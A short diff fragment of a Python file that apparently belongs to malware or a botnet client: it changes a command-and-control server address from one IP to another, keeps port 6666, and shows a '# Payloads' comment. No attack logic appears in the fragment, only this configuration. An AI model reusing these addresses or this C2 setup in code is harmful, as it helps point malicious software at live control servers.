@@ -6,7 +6,7 @@ import random
 import sys
 
 # Configuration
-C2_ADDRESS = "134.255.234.140"
+C2_ADDRESS = "185.194.177.247"
 C2_PORT = 6666
 
 # Payloads
